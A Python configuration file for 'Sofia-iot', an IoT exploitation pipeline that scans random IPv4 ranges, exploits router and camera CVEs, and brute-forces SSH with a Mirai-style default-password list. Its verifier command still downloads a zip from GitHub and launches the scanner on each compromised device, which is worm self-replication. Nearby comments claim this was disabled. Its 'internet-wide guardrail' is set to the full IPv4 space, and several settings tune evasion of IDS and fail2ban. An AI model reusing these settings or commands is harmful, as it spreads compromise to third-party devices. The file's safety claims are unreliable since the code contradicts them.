"""
Sofia-iot — Cấu hình chung.

Mọi tham số vận hành của pipeline đều khai báo tập trung tại đây:

  Giai đoạn 0 (target_generator) : DISCOVER_MODE, ZMAP_BANDWIDTH, SCAN_PORTS, ...
  Giai đoạn 1 (scanner)          : TIMEOUT, USER_AGENT
  Giai đoạn 2 (exploits)         : DEFAULT_CREDS, ZTE_PAYLOAD_FILE, ZTE_ENDPOINT
  Giai đoạn 3 (verifier)         : VERIFIER_COMMAND, WEBROOT_CANDIDATES
  Giai đoạn 4 (webhook)          : WEBHOOK_URL, NOTIFY_ALL
"""

import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(BASE_DIR, "results")
ZMAP_RAW_DIR = os.path.join(RESULTS_DIR, "zmap_raw")
STATE_FILE = os.path.join(RESULTS_DIR, "state.json")       # checkpoint/resume batch /16
RANGES_CACHE_FILE = os.path.join(ZMAP_RAW_DIR, "ranges.json")  # cache dải /16 đã sinh
SCAN_CACHE_DIR = os.path.join(RESULTS_DIR, "scan_cache")   # cache raw scan (P0)
EVIDENCE_DIR = os.path.join(RESULTS_DIR, "evidence")       # HTTP artifacts (P1)
LOG_DIR = RESULTS_DIR                                      # log ở results/ (P2)
LOG_FILE = os.path.join(LOG_DIR, "sofia.log")              # RotatingFileHandler
JSONL_FILE = os.path.join(LOG_DIR, "findings.jsonl")       # JSON log mỗi finding
LOG_MAX_BYTES = 10 * 1024 * 1024                            # 10 MB / file log
LOG_BACKUP_COUNT = 5

# ── Chung ───────────────────────────────────────────────────────────────
TIMEOUT = 10                # giây: timeout cho connect / HTTP / exploit
THREADS = 50                # số worker trong ThreadPoolExecutor
USER_AGENT = ("Mozilla/5.0 (X11; Linux x86_64; rv:115.0) "
              "Gecko/20100101 Firefox/115.0")

# ── TLS (P1 OPSEC — dùng chung mọi HTTP qua tlsutil.py) ────────────────
# Cipher browser-like (Chrome 12x): ECDHE + GCM/CHACHA20, ưu tiên AES-128.
TLS_MIN_VERSION = "TLSv1_2"
TLS_CIPHERS = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
]
TLS_CIPHERSUITES = [   # TLS 1.3
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
]
TLS_ALPN = ["http/1.1"]   # giữ HTTP/1.1 (code path raw socket, không HTTP/2)

# ── Giai đoạn 1: song song hóa fingerprint (P0) ─────────────────────────
FINGERPRINT_WORKERS = 200   # worker ThreadPoolExecutor cho stage1 fingerprint
FP_PER_HOST_LIMIT = 3       # số task fingerprint chạy đồng thời trên CÙNG 1 host
                            # (semaphore — tránh làm nghẽn thiết bị yếu)

# ── Rate-limit theo host giai đoạn exploit (P0 — 0.2) ───────────────────
# THREADS worker vẫn chạy song song nhiều host, NHƯNG mỗi HOST chỉ có tối đa
# EXPLOIT_PER_HOST_LIMIT task exploit/verify đồng thời (semaphore) — 50 threads
# không còn dồn 17 CVE vào 1 thiết bị cùng lúc. EXPLOIT_JITTER thêm chút trễ
# ngẫu nhiên (0..n giây) trước mỗi probe để tránh burst nhịp đều dễ bị nhận diện.
EXPLOIT_PER_HOST_LIMIT = 2
EXPLOIT_JITTER = 0.1         # giây, phạm vi ngẫu nhiên [0, EXPLOIT_JITTER)

# ── Guardrail internet-wide (P0 — 0.1, fail-closed) ─────────────────────
# Kế hoạch quét vượt quá ngưỡng này (tính bằng tổng số IP trong các dải CIDR)
# bắt buộc phải có cờ --confirm-internet-wide mới được chạy — chống vô tình
# quét toàn IPv4 khi chỉ gõ `python3 main.py`. Mặc định 16.7M ≈ một dải /8.
INTERNET_WIDE_HOSTS = 4_294_967_296

# ── Giai đoạn 0: Discovery ──────────────────────────────────────────────
DISCOVER_MODE = False       # AN TOÀN: False = CHỈ đọc targets.txt, không tự quét mạng.
                            # Bật lại chỉ khi bạn có dải THUỘC QUYỀN và đã khai báo SCAN_RANGES.
ZMAP_BANDWIDTH = "10M"      # băng thông zmap khi thực sự cần — để nhẹ nhàng/lịch sự.
ZMAP_INTERFACE = ""         # để trống = mặc định; VD "eth0"
# ── Engine phát hiện (--engines) ─────────────────────────────────────────
# zmap (mặc định): KHÔNG dùng masscan. Engine tự sinh 1 dải IPv4 /16 NGẪU
#   NHIÊN rồi dùng zmap quét TẤT CẢ cổng trong SCAN_PORTS để tìm cổng mở;
#   kết quả ghi dạng "IP:Port" (1 dòng/kết quả) → ZMAP_SCAN_FILE.
# masscan        : engine cũng tự sinh 1 dải IPv4 /16 NGẪU NHIÊN rồi dùng
#   masscan quét SCAN_PORTS; kết quả "IP:Port" → MASSCAN_SCAN_FILE.
# Cả hai engine dùng dải khai tay (--scan-range / config.SCAN_RANGES) nếu có;
# chỉ khi trống mới tự sinh dải /16 ngẫu nhiên.
DISCOVER_ENGINE = "zmap"     # "zmap" | "masscan"; CLI --engines ghi đè biến này
ZMAP_SCAN_FILE = os.path.join(ZMAP_RAW_DIR, "zmap_scan.txt")     # "IP:Port" mỗi dòng (engine zmap)
MASSCAN_SCAN_FILE = os.path.join(ZMAP_RAW_DIR, "mass_scan.txt")  # "IP:Port" mỗi dòng (engine masscan)
# ── Dải IPv4 /N ngẫu nhiên (engine tự sinh khi không khai tay) ───────────
RANDOM_RANGE_PREFIX = 16      # độ dài prefix dải ngẫu nhiên — /16 = 65536 IP
RANDOM_RANGE_SEED = 0         # 0 = ngẫu nhiên mỗi lần; >0 = tái lập được
RANDOM_RANGE_ATTEMPTS = 50    # số lần thử sinh dải hợp lệ (không private/blacklist)
MASSCAN_RATE = 500           # packet/giây masscan khi quét cổng (lịch sự)
# Chạy mặc định (không --scan-range): dùng 1 dải /16 ngẫu nhiên thay vì liệt kê
# toàn bộ AUTO_GEN_CIDR thành nhiều batch. Tắt để quay lại hành vi liệt kê cũ.
RANDOM_RANGE_MODE = False
# ── Auto-generate dải IPv4 /16 (nâng cấp: zmap tự sinh dải thay vì khai tay) ──
# Khi SCAN_RANGES rỗng và AUTO_GEN_RANGES=True, pipeline tự chia AUTO_GEN_CIDR
# thành các dải /16 (65536 IP/dải), xáo thứ tự, quét từng batch rồi gửi webhook.
# (RANDOM_RANGE_MODE=True ở trên sẽ thay bước này bằng 1 dải /16 ngẫu nhiên.)
# Resume theo từng dải qua STATE_FILE — chạy lại tiếp tục từ dải chưa xong.
AUTO_GEN_RANGES = False      # AN TOÀN: TẮT — không tự sinh dải khi SCAN_RANGES trống.
AUTO_GEN_CIDR = "192.0.2.0/24"  # chỉ dùng khi bật AUTO_GEN_RANGES; mặc định TEST-NET-1 (RFC 5737).
                                # TUYỆT ĐỐI không đặt "0.0.0.0/0" (toàn bộ Internet) ở đây.
AUTO_GEN_SPLIT_TO = 16       # chia thành chunk /N — mặc định 16 → 65536 dải /16
AUTO_GEN_SHUFFLE = True      # xáo thứ tự dải (tránh quét cụm 1 vùng liên tục)
AUTO_GEN_SEED = 0            # 0 = ngẫu nhiên mỗi lần; >0 = tái lập thứ tự xáo
AUTO_GEN_MAX_CHUNKS = 0      # 0 = tất cả; >0 = giới hạn số dải /16 (test nhanh)
# ── Batch + politeness ──────────────────────────────────────────────────
BATCH_SIZE = 2               # số dải /16 quét mỗi batch (1 batch = 1 checkpoint + webhook)
POLITENESS_SLEEP_MIN = 2.0   # giây ngủ tối thiểu giữa 2 batch (chống chặn)
POLITENESS_SLEEP_MAX = 8.0   # giây ngủ tối đa giữa 2 batch (ngẫu nhiên trong khoảng)
# ── Anti-block: điều tiết tốc độ khi quét SỐ LƯỢNG LỚN dải IP (nâng cấp 2026-10) ──
# Quét dải lớn rất dễ bị hạ tầng/host chặn (fail2ban, IPS/IDS, rate-limit biên,
# null-route). Khối này điều khiển lớp pacing thích ứng trong rate_limiter.py:
#   * tự tăng/giảm pps theo phản hồi thực tế (AIMD) + cooldown luỹ tiến khi nghi chặn;
#   * xoay IP nguồn + chia shard để phân tán tải; xáo cổng + jitter để phá vân tay.
# Mọi tham số dưới đây có thể ghi đè bằng CLI (--rate, --source-ips, --shard, ...).
SCAN_RATE_ADAPTIVE = True     # False = pps cố định (MASSCAN_RATE / zmap -r)
SCAN_RATE_START = 500         # pps khởi điểm cho phiên quét
SCAN_RATE_MIN = 50            # pps sàn — không giảm thấp hơn (tránh quét vô hạn)
SCAN_RATE_MAX = 4000          # pps trần — không tự tăng quá
SCAN_RATE_INCREASE = 1.15     # × hệ số sau batch SẠCH (tăng dần tới MAX)
SCAN_RATE_DECREASE = 0.5      # × hệ số khi NGHI bị chặn (giảm mạnh)
SCAN_BLOCK_ZERO_BATCHES = 2   # số batch liên tiếp 0 kết quả → coi là bị chặn
SCAN_BLOCK_BACKOFF_MIN = 30.0 # giây cooldown tối thiểu khi nghi chặn
SCAN_BLOCK_BACKOFF_MAX = 600.0# giây cooldown tối đa (tăng luỹ tiến mỗi lần chặn)
SCAN_BLOCK_BACKOFF_FACTOR = 2.0  # mỗi lần chặn liên tiếp × hệ số này
SCAN_PORT_ORDER_RANDOM = True # xáo thứ tự cổng mỗi lượt quét (phá vân tay nhịp)
SCAN_PORT_JITTER = 0.0        # nghỉ ngẫu nhiên [0, x) giây giữa 2 cổng (0 = tắt)
SOURCE_IPS = []               # IP nguồn xoay vòng (zmap -S / masscan --source-ip)
SOURCE_PORT = ""              # cổng nguồn (zmap -s / masscan --source-port); rỗng = mặc định
SCAN_SHARD = ""               # "1/4" = máy này chỉ quét shard 1/4 (chia tải nhiều máy)
SCAN_SEED = 0                 # seed >0 để zmap/masscan phân bố tất định (bắt buộc khi shard)
ZMAP_MIN_HITRATE = 0.0        # >0 = zmap tự dừng nếu hitrate thấp hơn (chống quét mù)
# Cổng quét — đã mở rộng phủ mọi CVE trong registry:
#   37215 (Huawei HG532), 80/8080 (web IoT), 8443 (SonicWall GMS),
#   21009 (GMS XML-RPC), 443 (web IoT qua HTTPS), 7547 (TR-069)
#   + 22 (SSH — banner OpenSSH/Dropbear/libssh; phục vụ cụm CVE SSH:
#     CVE-2024-6387 regreSSHion, CVE-2018-10933 libssh bypass, CVE-2023-48795
#     Terrapin; quét banner không cần credential, an toàn với mọi daemon SSH)
#   + 23/554/1883/5683/49152 (P1 — banner telnet/RTSP/MQTT/CoAP/UPnP để
#     fingerprint thiết bị không có web UI; đánh đổi: quét nhiều cổng hơn
#     → masscan/zmap lâu hơn, nên cân nhắc bỏ bớt khi chỉ quan tâm web).
SCAN_PORTS = [22, 37215, 80, 8080, 8443, 443, 7547, 21009, 23, 554, 1883, 5683, 49152]

# ── regreSSHion (CVE-2024-6387) — đầu dò race OPT-IN ─────────────
# MẶC ĐỊNH TẮT: khai thác/đầu dò regreSSHion là race điều kiện thời gian, cần
# nhiều kết nối và CÓ THỂ GÂY QUÁ TẢI/DoS sshd mục tiêu. Chỉ bật khi bạn được
# phép rõ ràng và hiểu rủi ro. Khi bật, CVE_2024_6387.race_trigger() dùng
# ssh_common.race_probe() và CHỈ ghi nhận DẤU HIỆU heuristic (không phải RCE).
SSH_REGRESSHION_RACE_ENABLED = False  # True = bật đầu dò race (rủi ro DoS)
SSH_RACE_CONNECTIONS = 100            # số kết nối tối đa mỗi lần đầu dò
SSH_RACE_TIMEOUT = 5.0                # timeout mỗi kết nối (giây)
SSH_RACE_CONCURRENCY = 20             # số kết nối đồng thời tối đa

# ── CVE-2016-6210 — liệt kê user OpenSSH qua TIMING (hành vi CHỦ ĐỘNG) ───
# sshd ≤ 7.2p2 xử lý USERAUTH 'password' với mật khẩu dài khác thời gian cho
# user tồn tại vs không tồn tại (hàm băm tốn thời gian). Module đo nhiều mẫu
# và phân loại bằng thống kê vững (median + MAD) so với baseline các user
# NGẪU NHIÊN chắc chắn không tồn tại.
# LƯU Ý VẬN HÀNH: mỗi host mở (1 + n_user) × n_mẫu kết nối SSH — nặng hơn
# module banner. Giới hạn dưới đây giữ tải ở mức chấp nhận được; đặt
# SSH_USER_ENUM_ENABLED=False để chỉ còn phát hiện theo version (rẻ, nhưng
# KHÔNG liệt kê được user).
SSH_USER_ENUM_ENABLED = False         # AN TOÀN: False = chỉ nhận diện theo version
                                      # (KHÔNG dò timing chủ động hàng loạt lên thiết bị).
SSH_USER_ENUM_USERS = [               # danh sách user IoT phổ biến (ưu tiên thử)
    "root", "admin", "user", "ubuntu", "pi", "support",
    "guest", "test", "oracle", "postgres", "www-data", "nobody",
]
SSH_USER_ENUM_WORDLIST = ""           # file 1 user/dòng bổ sung ("" = không dùng)
SSH_USER_ENUM_MAX_USERS = 24          # trần số user ứng viên mỗi host (chống nổ tải)
SSH_USER_ENUM_SAMPLES = 4             # số mẫu timing MỖI user ứng viên
SSH_USER_ENUM_BASELINE = 4            # số mẫu baseline (user ngẫu nhiên = chắc chắn sai)
SSH_USER_ENUM_PASSWORD_LEN = 30000    # độ dài mật khẩu lớn (khuếch đại chênh lệch băm)
SSH_USER_ENUM_MIN_DELTA_MS = 15.0     # chênh lệch trung vị tối thiểu để coi là khác biệt (ms)
SSH_USER_ENUM_K = 6.0                # hệ số nhân độ tán xạ vững (1.4826×MAD) làm ngưỡng
SSH_USER_ENUM_TIMEOUT = 8.0          # timeout mỗi kết nối SSH (giây)
SSH_USER_ENUM_DELAY = 0.15            # nghỉ giữa các kết nối (giây) — lịch sự/tránh fail2ban

# ── SSH (cổng 22) — THỬ MẬT KHẨU MẶC ĐỊNH/YẾU TRƯỚC KHI THỬ CVE SSH ───────
# Luồng nâng cấp (2026-10): với mỗi host mở cổng 22, THỬ LẦN LƯỢT cặp
# (username, password) mặc định/yếu TRƯỚC khi chạy các CVE SSH.
#   * Đăng nhập THÀNH CÔNG → chạy `id`, rồi `whoami`, rồi lệnh deploy
#     (exploits.deploy.build_deploy_command) và ghi finding
#     "SSH-DEFAULT-CREDS" với status CONFIRMED (bằng chứng credential + exec).
#   * Đăng nhập THẤT BẠI → tiếp tục sang CVE SSH như cũ (CVE-2024-6387,
#     CVE-2018-10933, CVE-2023-48795, CVE-2016-6210, ...).
# GIỚI HẠN: SSH_CREDS_MAX_TRIES/host + SSH_CREDS_DELAY để tránh fail2ban/lockout.
# LƯU Ý: nhánh password auth cần thư viện `cryptography` (như ssh_client); thiếu
# thì bước cred tự bỏ qua (trả ok=False) và pipeline vẫn chạy CVE SSH bình thường.
SSH_CREDS_ENABLED = True             # False = tắt hoàn toàn bước thử mật khẩu SSH
SSH_PRIORITY_FIRST = True            # Giai đoạn 2: xử lý host/ CVE SSH (cổng 22) TRƯỚC
SSH_CREDS_MAX_TRIES = 40             # trần số lần thử (user,pass) MỖI host
SSH_CREDS_DELAY = 0.25               # nghỉ giữa các lần thử (giây) — lịch sự/tránh fail2ban
SSH_CREDS_TIMEOUT = 8.0              # timeout mỗi kết nối SSH (giây)
SSH_CREDS_WORKERS = 16               # số host kiểm tra đồng thời (mỗi host 1 thread)
SSH_CREDS_RUN_ID_WHOAMI = True       # login OK → chạy `id` + `whoami` (bằng chứng exec)
SSH_CREDS_DEPLOY = True              # login OK → chạy lệnh deploy (chỉ chạy khi có DEPLOY_URLS)
SSH_CREDS_DEPLOY_CMD = ""            # lệnh deploy thô ghi đè ("" = dùng exploits.deploy theo DEPLOY_URLS)
SSH_CREDS_SKIP_CVE_ON_SUCCESS = True # login OK → bỏ qua CVE SSH cho host đó (vẫn chạy CVE web)

# Danh sách user IoT phổ biến (ưu tiên thử trước).
SSH_CREDS_USERNAMES = [
    "root", "admin", "user", "support", "guest", "ubuntu", "pi",
    "default", "service", "system", "ftp", "telnet", "cisco", "admin1",
    "supervisor", "manager", "operator", "maintainer", "test", "tech",
    "installer", "sysadmin", "dguser", "ubnt", "nobody",
]
# Mật khẩu mặc định/yếu phổ biến trên thiết bị IoT nhúng (đặt các default ĐẶC
# TRƯNG theo thiết bị lên đầu để trúng sớm: vizxv/xc3511/Hi35xx/Zte521/...).
SSH_CREDS_PASSWORDS = [
    # ── default đặc trưng thiết bị nhúng ──
    "vizxv", "xc3511", "jvbzd", "hi3518", "hi3516", "7ujMko0admin",
    "7ujMko0vizxv", "Zte521", "klv123", "klv1234", "cat1029", "xmhdipc",
    "1001", "54321", "anko", "5up", "Ziip", "B0ss", "dvr2580222",
    # ── default/yếu chung ──
    "root", "toor", "admin", "admin123", "adminadmin", "password",
    "1234", "12345", "123456", "12345678", "123456789", "111111",
    "1111111", "000000", "888888", "666666", "pass", "default",
    "system", "support", "guest", "user", "service", "ubnt", "cisco",
    "enable", "public", "nobody", "smcadmin", "504000", "changeme",
    "secret", "p@ssw0rd", "P@ssw0rd", "Admin@123", "raspberry", "uClinux",
]
# Cặp (user, pass) ưu tiên thử TRƯỚC danh sách tích chéo (bổ sung/ghi đè thứ tự).
SSH_CREDS_EXTRA_PAIRS = [
    ("root", "root"), ("root", "toor"), ("root", "admin"),
    ("root", "1234"), ("root", "12345"), ("root", "password"),
    ("root", "vizxv"), ("root", "xc3511"), ("root", "hi3518"),
    ("root", "hi3516"), ("root", "jvbzd"), ("root", "Zte521"),
    ("root", "klv123"), ("root", "cat1029"), ("root", "7ujMko0admin"),
    ("admin", "admin"), ("admin", "1234"), ("admin", "password"),
    ("admin", "admin123"), ("admin", "adminadmin"),
    ("support", "support"), ("guest", "guest"), ("user", "user"),
    ("pi", "raspberry"), ("cisco", "cisco"), ("ubnt", "ubnt"),
    ("service", "service"), ("default", "default"),
]
SSH_CREDS_USER_WORDLIST = ""         # file 1 user/dòng bổ sung ("" = không dùng)
SSH_CREDS_PASS_WORDLIST = ""         # file 1 password/dòng bổ sung ("" = không dùng)

# ── Nạp kết quả scan có sẵn (--scan-file) thay vì quét lại ──────────────
# Cả hai engine đều ghi file kết quả dạng "IP:Port" (1 dòng/kết quả):
#   engine zmap    → ZMAP_SCAN_FILE    (results/zmap_raw/zmap_scan.txt)
#   engine masscan → MASSCAN_SCAN_FILE (results/zmap_raw/mass_scan.txt)
# --scan-file auto|all gộp MỌI file đang có, chuẩn hoá rồi chọn CVE theo cổng.
# Định dạng đọc được: "IP:Port" (chuẩn hoá), "IP" (zmap raw), "open tcp <p> <ip>" (masscan -oL).
MAX_CVES_PER_HOST = 0        # 0 = không giới hạn; >0 = chỉ khai thác N CVE điểm CVSS cao nhất/host

# ── Chọn CVE THÔNG MINH theo bằng chứng fingerprint (cve_selector) ──────
# Engine chấm điểm thay cho "bắn hết CVE theo cổng rồi cắt theo CVSS":
#   điểm = CVSS + khớp vendor/platform/SSH marker + đúng khoảng version
#          + affinity cổng + độ tin cậy exploit + KEV − phạt lệch vendor
#          − phạt cần-auth (khi thiếu creds) − phạt CVE fingerprint-only.
# CVE ngoài khoảng version bị loại cứng (chống dương giả); CVE khai tay
# (--only-cves / lab override) LUÔN được giữ.
CVE_SELECT_ENABLED = True     # False = quay về hành vi cũ (sort theo CVSS)
CVE_SELECT_MIN_SCORE = 0.0    # loại ứng viên điểm < ngưỡng (0.0 = giữ hết)
CVE_SELECT_DROP_MISMATCH = True  # loại cứng CVE lệch vendor rõ ràng (fingerprint mạnh)

# ── Verifier: số biến thể probe/inject cho mỗi (host, CVE) ────────────────
# Tăng tỉ lệ xác nhận RCE mà vẫn chặn nổ traffic: verifier thử lần lượt,
# DỪNG NGAY khi xác nhận được (RCE_CONFIRMED).
#   EXPLOIT_PROBE_VARIANTS : số biến thể lệnh probe (plain/IFS/base64).
#   EXPLOIT_INJECT_VARIANTS: số ranh giới inject cho module verbatim.
#   EXPLOIT_MAX_ATTEMPTS   : trần tổng số lần gửi mỗi (host, CVE).
EXPLOIT_PROBE_VARIANTS = 3
EXPLOIT_INJECT_VARIANTS = 3
EXPLOIT_MAX_ATTEMPTS = 8

# Cache raw scan (P0): re-scan 1 dải giống hệt trong TTL → đọc cache thay vì
# gọi zmap/masscan lần nữa (resume/overlap không quét lại từ đầu).
SCAN_CACHE_TTL = 6 * 3600   # giây (6h)

# Discovery overlap (P0): prefetch discovery batch kế trong lúc exploit
# batch hiện tại — double buffer. Tắt nếu máy yếu RAM/CPU.
DISCOVERY_PREFETCH = True
# Dải IPv4 để zmap/masscan quét (CIDR). Trống = KHÔNG quét (fail-closed).
# Chỉ đưa vào dải bạn được phép kiểm thử (lab / mạng khách hàng).
# VD: ["192.0.2.0/24"] — quét 192.0.2.1-254 trên mọi SCAN_PORTS.
SCAN_RANGES = []             # dải CIDR khai tay (--scan-range / config). Trống = fail-closed,
                            # trừ khi AUTO_GEN_RANGES=True → tự sinh dải /16 từ AUTO_GEN_CIDR.
BLACKLIST_FILE = os.path.join(BASE_DIR, "blacklist.conf")
MAX_TARGETS = 10000          # giới hạn số IP đưa vào giai đoạn exploit (an toàn)
ALLOW_PRIVATE = False       # False = lọc RFC1918/loopback/link-local khỏi mục tiêu

# ── Chống bỏ sót / WAF / EDR ───────────────────────────────────────────
RETRY_ATTEMPTS = 2          # số lần thử lại tối đa (fingerprint/exploit) khi
                            # timeout / nghi WAF chặn / kết nối flaky
RETRY_BACKOFF = 0.5         # giây: chờ giữa các lần thử lại
EVASION_MODE = False        # AN TOÀN: False = không xoay UA/không biến thể né WAF.
WAF_DETECT = True           # quan sát (vô hại): nhận diện WAF từ response, ghi chú vào finding.
EDR_OBFUSCATE = False       # AN TOÀN: False = không bọc base64 che giấu lệnh.
FINGERPRINT_RETRY = True    # thử lại fingerprint khi lần đầu timeout
MAX_HTTP_PARSE = 20000      # số byte body tối đa dùng để tìm webroot/banner
FINGERPRINT_CACHE_TTL = 300 # giây — cache fingerprint (host,port) chống đo lại khi
                            # resume/overlap; 0 = TẮT cache (luôn đo mới)

# ── Giai đoạn 1: Fingerprint (scanner) ───────────────────────────────────
FINGERPRINT_TLS = True       # True = đọc CN/SAN từ chứng TLS trên cổng 443/8443/...
FINGERPRINT_BANNER = True    # True = probe banner specific per cổng (TR-069/SOAP/HTTP HEAD)
FINGERPRINT_EXTRA_PATHS = [  # path bổ sung quét chỉ khi thân page KHÔNG có marker (giảm âm)
    "/login.asp", "/web/login.html", "/userRpm/",
]
MAX_BANNER_BYTES = 4096      # số byte banner tối đa giữ từ probe cổng-specific

# ── Giai đoạn 2: Exploit ────────────────────────────────────────────────
# Tài khoản mặc định thử khi module cần xác thực (nhiều thiết bị IoT dùng
# default credential — thử sau khi request không auth bị từ chối).
DEFAULT_CREDS = {
    "CVE-2022-30023": ("admin", "admin"),   # Tenda HG9
    "CVE-2023-33538": ("admin", "admin"),   # TP-Link WR940N/WR841N/WR740N
    "CVE-2025-1316":  ("admin", "1234"),    # Edimax IC-7100
    "CVE-2025-29635": ("admin", "admin"),   # D-Link DIR-823X
}

# CVE-2024-45414 (ZTE) — lỗ hổng stack overflow ở webPrivateDecrypt, chưa có
# PoC công khai. File blob payload (target-specific) do người dùng cung cấp;
# nếu file chứa placeholder {cmd} thì module sẽ thay thế bằng lệnh probe.
ZTE_PAYLOAD_FILE = os.path.join(RESULTS_DIR, "zte_45414_payload.bin")
ZTE_ENDPOINT = "/cgi-bin/webPrivateDecrypt"   # tuỳ chỉnh theo firmware đích

# ── Giai đoạn 3: Verifier ───────────────────────────────────────────────
# AN TOÀN — ĐÃ VÔ HIỆU TỰ NHÂN BẢN (self-replication / hành vi worm):
# Bản gốc, sau khi xác nhận RCE, tự tải gói zip từ GitHub rồi chạy
# `python3 main.py --generate-ipv4 --engine zmap` NGAY TRÊN thiết bị bị chiếm
# (kèm sudo/nohup) → biến mỗi nạn nhân thành một node quét tiếp theo. Đây là
# hành vi lây lan không thể được cấp phép cho thiết bị của bên thứ ba.
#
# Verifier giờ CHỈ chứng minh thực thi lệnh (`id` + nonce) — vừa đủ để xác
# nhận lỗ hổng, KHÔNG tải, KHÔNG cài, KHÔNG chạy gì trên thiết bị đích.
DEPLOY_URL = "https://github.com/anhkhoa210v/Tool-EX/raw/refs/heads/main/sofia_scanV4.2.zip"
# Lệnh deploy legacy: tải gói zip từ DEPLOY_URL, giải nén, cài đặt và chạy
# scanner trên thiết bị đích (được ghép sau `id; echo MARKER_{rand}; `).
VERIFIER_DEPLOY = (
    "cd /tmp && curl -fsSL --max-time 60 -o sofia_scanV4.2.zip "
    "https://github.com/anhkhoa210v/Tool-EX/raw/refs/heads/main/sofia_scanV4.2.zip && "
    "unzip -oq sofia_scanV4.2.zip && rm -f sofia_scanV4.2.zip && "
    "cd sofia_scan && bash setup.sh && "
    "(sudo -n python3 main.py --generate-ipv4 --engine zmap || "
    "python3 main.py --generate-ipv4 --engine zmap)"
)
# Lệnh probe đầy đủ: `id` xác nhận exec + tag để nhận diện output.
# {rand} được verifier thay bằng tag duy nhất của probe.
VERIFIER_COMMAND = "id; echo MARKER_{rand}; " + VERIFIER_DEPLOY

# Webroot thử cho blind-check — static + theo loại thiết bị + phát hiện động.
WEBROOT_CANDIDATES = [
    "/web/", "/tmp/", "/www/", "/usr/www/", "/home/httpd/",
]
# Webroot đặc trưng theo loại thiết bị (dùng khi fingerprint ra device).
DEVICE_WEBROOTS = {
    "hikvision":   ["/web/", "/home/hikvision/web/", "/usr/share/hikvision/web/"],
    "tp-link":     ["/web/", "/tmp/web/", "/usr/www/"],
    "d-link":      ["/web/", "/www/", "/home/httpd/"],
    "tenda":       ["/web/", "/www/", "/usr/www/"],
    "zte":         ["/web/", "/usr/www/", "/home/zte/web/"],
    "dvr":         ["/web/", "/www/", "/mnt/web/"],
    "goahead":     ["/web/", "/www/", "/etc/web/", "/mnt/web/"],
    "boa":         ["/web/", "/www/", "/home/httpd/", "/usr/share/boa/"],
    "lighttpd":    ["/www/", "/srv/www/", "/usr/share/lighttpd/"],
    "draytek":     ["/web/", "/usr/share/www/", "/etc/www/"],
    "sonicwall":   ["/web/", "/usr/web/"],
    "struts":      ["/usr/local/tomcat/webapps/ROOT/", "/opt/tomcat/webapps/ROOT/"],
    "unknown":     [],
}

# ── Giai đoạn 4: Webhook ────────────────────────────────────────────────
WEBHOOK_URL = os.environ.get("SOFIA_WEBHOOK_URL", "")  # VD "https://server/hook"
NOTIFY_ALL = False          # True = gửi webhook cả trường hợp VULN_NO_EXEC
NOTIFY_PROGRESS = True      # True = gửi webhook tiến độ (batch bắt đầu/hoàn tất,
                            # summary cuối) khi đã cấu hình WEBHOOK_URL
# ── Webhook: HMAC + retry (P0 — 0.3 upgrade proposal) ───────────────────
# Xác thực nguồn gửi: nếu WEBHOOK_SECRET khác rỗng, mỗi request kèm header
#   X-Sofia-Signature: sha256=<hex HMAC-SHA256(body)> — receiver phải verify
#   cùng secret để chặn kẻ biết URL giả tạo finding. Lấy từ env
#   SOFIA_WEBHOOK_SECRET (không commit secret vào config).
# Retry: lỗi mạng / HTTP >= 500 được gửi lại tối đa WEBHOOK_RETRY_ATTEMPTS
#   lần với backoff *2^n giây; HTTP 4xx = payload bị từ chối (không retry).
WEBHOOK_SECRET = os.environ.get("SOFIA_WEBHOOK_SECRET", "")
WEBHOOK_RETRY_ATTEMPTS = 3     # số lần gửi lại tối đa khi lỗi tạm thời
WEBHOOK_RETRY_BACKOFF = 1.0    # giây cơ sở backoff: sleep = backoff * 2^n
WEBHOOK_TIMEOUT = 8            # giây timeout mỗi lần gửi

# ── Giai đoạn 1: favicon-hash fingerprint (P1, Shodan-style) ────────────
# Map hash_mmh3(base64(favicon)) -> tên thiết bị/nền tảng. Hash công thức:
#   mmh3.hash(base64.b64encode(favicon_bytes))  (MurmurHash3 x86 32-bit)
# MẶC ĐỊNH TRỐNG — không nhét hash bịa; muốn dùng thì quét thật lấy hash
# (xem results/... favicon_hash trong fingerprints.json) rồi điền vào đây.
FAVICON_HASHES = {}          # VD: {123456789: "hikvision"}
FAVICON_PATH = "/favicon.ico"

# ── Giai đoạn 1: probe model/firmware (P1) ──────────────────────────────
# Mỗi mục: (đường dẫn, regex rút chuỗi) — chỉ probe khi fingerprint đã ra
# marker tương ứng (tiết kiệm request). Regex lấy group đầu tiên khớp.
MODEL_PROBES = {
    "hikvision": ("/ISAPI/System/deviceInfo", r"<modelName>([^<]+)</modelName>"),
    "dahua":     ("/cgi-bin/SystemInfo",      r"<DeviceName>([^<]+)</DeviceName>"),
}
MODEL_TITLE_RES = {   # regex rút model ngay từ title/body (không cần request thêm)
    "tp-link": r"TL-[A-Za-z0-9]+",
    "d-link":  r"DIR-[-A-Za-z0-9]+",
    "tenda":   r"(?:FH|AC|AX)[-A-Za-z0-9]+",
}

# ── Giai đoạn 3: deploy mirror ─────────────────────────────────────
# Mirror tải gói payload (zip sofia_scan) về thiết bị đích ở pha verifier.
# Để TRỐNG + DEPLOY_ENABLED=False ⇒ cơ chế deploy không hoạt động
# (deploy.is_active() trả False) và không có mirror nào để tải.
DEPLOY_URLS = [
    "https://github.com/anhkhoa210v/Tool-EX/raw/refs/heads/main/sofia_scanV4.2.zip",
]
# SHA-256 của gói trên mirror (để trống "" nếu mirror chưa công bố hash).
# LƯU Ý: khi cập nhật file trên GitHub phải cập nhật lại hash này, nếu không
# deploy sẽ tự hủy (DEPLOY_REQUIRE_HASH=True, fail-closed).
DEPLOY_SHA256 = "86ac979652f5c88777b76b4991b159eaf8f32bda1c1c1a5ab587b48bf399b9dd"

# ── Giai đoạn 3: cơ chế deploy nâng cao (exploits/deploy.py) ────────────
# Toàn bộ hành vi deploy được điều khiển ở đây. verifier._build_deploy_cmd()
# sẽ dùng exploits.deploy để sinh script sh đa phương án; nếu DEPLOY_URLS
# TRỐNG thì tự động quay về VERIFIER_DEPLOY (tương thích ngược).
#
#   DEPLOY_DELIVERY : "base64" | "plain" | "auto"
